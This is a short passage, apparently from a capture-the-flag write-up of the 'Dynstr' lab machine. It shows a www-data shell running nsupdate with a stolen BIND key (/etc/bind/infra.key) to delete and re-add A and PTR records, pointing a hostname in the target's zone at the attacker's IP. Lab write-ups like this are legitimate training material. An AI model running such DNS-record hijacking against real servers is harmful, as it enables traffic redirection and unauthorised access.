```bash
www-data@dynstr:/tmp$ cat cmd 
server 127.0.0.1
zone dyna.htb
update delete foo.infra.dyna.htb
update add foo.infra.dyna.htb 30 IN A 10.10.14.96
send

server 127.0.0.1
zone 10.in-addr.arpa
update delete 96.14.10.10.in-addr.arpa PTR
update add 96.14.10.10.in-addr.arpa 30 IN PTR foo.infra.dyna.htb
send
```




```bash
cat cmd | /usr/bin/nsupdate -t 1 -k /etc/bind/infra.key
```